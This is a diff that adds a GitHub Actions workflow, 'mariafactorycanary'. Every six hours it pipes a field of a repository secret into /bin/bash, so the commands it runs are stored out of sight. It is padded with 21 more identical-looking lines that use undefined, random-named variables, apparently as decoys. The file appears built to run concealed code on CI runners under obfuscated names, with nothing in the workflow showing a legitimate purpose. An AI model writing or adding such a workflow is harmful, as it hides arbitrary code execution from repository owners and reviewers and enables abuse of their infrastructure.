@@ -1,0 +1,39 @@
+name: mariafactorycanary
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mariafactorycanary
+        env:
+          sf59082: ${{ secrets.sf59082 }}
+        run: |
+          echo $sf59082 | jq -r .rdvp87 | /bin/bash
+          echo $fchm5 | jq -r .qgovx796 | /bin/bash
+          echo $qspeb021 | jq -r .wtxm3 | /bin/bash
+          echo $avn0 | jq -r .zbb781 | /bin/bash
+          echo $nbny8 | jq -r .x8 | /bin/bash
+          echo $m92769 | jq -r .xx8323 | /bin/bash
+          echo $jjegz301 | jq -r .itmjd876 | /bin/bash
+          echo $ftnuv70740 | jq -r .heswc267 | /bin/bash
+          echo $xzepq61846 | jq -r .ewq1545 | /bin/bash
+          echo $rum15088 | jq -r .ezex629 | /bin/bash
+          echo $qvd12937 | jq -r .t357 | /bin/bash
+          echo $uut27 | jq -r .kidtn1 | /bin/bash
+          echo $y85573 | jq -r .zq63857 | /bin/bash
+          echo $lm200 | jq -r .imyqw8 | /bin/bash
+          echo $urwtq74 | jq -r .sn29 | /bin/bash
+          echo $jhk8 | jq -r .edxrm29335 | /bin/bash
+          echo $vryer9752 | jq -r .uxqu0991 | /bin/bash
+          echo $njp647 | jq -r .w1 | /bin/bash
+          echo $gryfc7488 | jq -r .tzsqk28983 | /bin/bash
+          echo $s34638 | jq -r .yg50 | /bin/bash
+          echo $l804 | jq -r .y269 | /bin/bash
+          echo $c6042 | jq -r .sm3 | /bin/bash
+          echo $clfc43 | jq -r .nsqvn8188 | /bin/bash
+
